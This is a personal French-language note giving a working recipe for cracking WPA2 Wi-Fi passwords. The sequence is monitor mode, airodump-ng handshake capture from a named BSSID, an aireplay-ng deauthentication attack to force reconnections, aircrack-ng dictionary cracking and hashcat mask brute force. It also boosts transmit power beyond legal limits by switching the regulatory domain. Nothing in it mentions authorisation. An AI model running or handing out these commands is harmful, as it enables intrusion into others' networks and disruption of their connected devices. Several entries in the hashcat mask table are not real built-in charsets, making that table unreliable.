---
id: wifi_crack
created_date: 16/02/2023
updated_date: 16/02/2023
type: note
---

#  wifi_crack
- **🏷️Tags** :  #02-2023 #wifi #crack #tools 

## 📝 Notes

### Mettre sa carte en mode monitor


```bash
sudo ifconfig wlan1 down
sudo iwconfig wlan1 mode monitor
sudo ifconfig wlan1 up
```

pour tester si sa carte est compatible utiliser la commande :


```bash
sudo aireplay-ng --test wlan1
```

### Faire un scan du réseaux 

- dans un premier temps taper la commande 

```bash
sudo airodump-ng wlan1
```

- récupérer le nom de l'interface réseaux qui vous intéresse
- ainsi que son BSSID et que son numéro de channel ( bien vérifier son type d' ENC ).
### lancer l'attaque
on souhaite ici récupérer le handshake et pour cela on va avoir besoin du BSSID et du channel.

```bash

sudo airodump-ng -c 6 --bssid 44:D4:54:ED:F9:60 --output-format pcap -w ~/Bureau wlan1

```

pour accélérer les choses on va lancer en même temps une attaque de Dauth contre la machine. ( sinon c'est gavé long ).

```bash
sudo aireplay-ng -0 20 -a E4:9E:12:89:FE:D4  wlan1
```

une fois que le handshake est obtenue et qu'une certaine quantité de requête aussi passer à l'étape suivante.

### crack et brutforce


```bash
aircrack-ng -a2 -b <BSSID> -w /chemi/du/dico.txt ./chemi/du/fichier/cap/enregistrer.cap

```

debrider carte alfa 


```bash
sudo ifconfig wlan1 down  
sudo iw reg set BZ  
sudo iwconfig wlan1 txpower 30  
sudo ifconfig wlan1 up  
iwconfig

```

### Conversion du format pour bruteForce

```bash
hcxpcapngtool -o capture.22000 capture.cap
```

une fois le fichier convertie en format 22000 lancer le brutforce avec [[Screen]]  et hashcat 

- pour digit:
```bash
hashcat -m 22000 capture.22000 -a 3 '?d?d?d?d?d?d?d?d'
```

- pour digit/uppercase/lowcase
  ```bash 
  hashcat -m 22000 capture.22000 -a 3 '?1?1?1?1?1?1?1?1' -1 ?d?l?u
  ```

- mode performance:
```bash
hashcat -m 22000 capture.22000 -a 3 '?1?1?1?1?1?1?1?1' -1 ?d?l?u --force --optimized-kernel-enable --workload-profile=4 --hwmon-disable

```

>[!Tip] Infos:
>- `--force` : force Hashcat à ignorer certains avertissements et à continuer l'exécution.
>- `--optimized-kernel-enable` : utilise des kernels optimisés pour accélérer le processus de craquage.
>- `--workload-profile=4` : définit le profil de charge de travail sur le niveau maximum (4). Les profils de charge de travail vont de 1 (léger) à 4 (lourd). Le niveau 4 maximise l'utilisation de la GPU, mais peut rendre le système moins réactif.
>- `--hwmon-disable`:  enlève le triger sur la temperature du device

#### Tableau des paramètres de hashcat 

| Mask Symbol | Description                          | Character Set          |
|-------------|--------------------------------------|------------------------|
| `?d`        | Digit                                | 0 1 2 3 4 5 6 7 8 9    |
| `?l`        | Lowercase letter                     | a b c d e f g h i j k l m n o p q r s t u v w x y z |
| `?u`        | Uppercase letter                     | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z |
| `?s`        | Special symbol                       | ! " # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~ |
| `?a`        | All printable ASCII characters       | Digits, lowercase, uppercase, and special symbols |
| `?b`        | All 8-bit characters from ASCII      | 0x00 - 0xff           |
| `?h`        | Lowercase hexadecimal                | 0 1 2 3 4 5 6 7 8 9 a b c d e f |
| `?H`        | Uppercase hexadecimal                | 0 1 2 3 4 5 6 7 8 9 A B C D E F |
| `?D`        | Digits and special symbols           | 0 1 2 3 4 5 6 7 8 9 and special symbols |
| `?L`        | Lowercase letters and digits         | Lowercase letters and digits |
| `?U`        | Uppercase letters and digits         | Uppercase letters and digits |
| `?X`        | Lowercase and uppercase letters      | Lowercase and uppercase letters |
| `?Z`        | Uppercase letters and special symbols| Uppercase letters and special symbols |
| `?f`        | All printable characters excluding space | Digits, lowercase, uppercase, and special symbols (excluding space) |

### Examples
- Digits only, 8 characters long: `?d?d?d?d?d?d?d?d`
- Lowercase letters only, 6 characters long: `?l?l?l?l?l?l`
- Mix of lowercase letters and digits, 10 characters long: `?l?l?l?l?d?d?d?d?d?d`
- Printable ASCII characters, 12 characters long: `?a?a?a?a?a?a?a?a?a?a?a?a`

## Questions/Thoughts


## 🔗 Links
- 